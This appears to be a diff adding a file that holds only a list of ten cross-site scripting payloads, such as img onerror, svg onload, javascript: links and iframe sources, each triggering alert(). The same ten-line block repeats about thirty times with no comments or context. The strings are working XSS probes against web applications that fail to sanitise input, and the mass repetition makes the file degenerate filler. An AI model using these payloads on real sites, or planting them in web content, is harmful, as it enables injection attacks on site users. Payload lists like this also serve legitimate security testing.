@@ -1,0 +1,329 @@
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
+
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert('XSS')">
+<div onmouseover=alert('XSS')>Hover me!</div>
+<a href="javascript:alert(1)">Click me</a>
+<input type="text" value="XSS" onfocus="alert(1)">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')"></svg>
+<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>
+<audio src onerror=alert('XSS')></audio>
+<iframe src="javascript:alert(1)"></iframe>
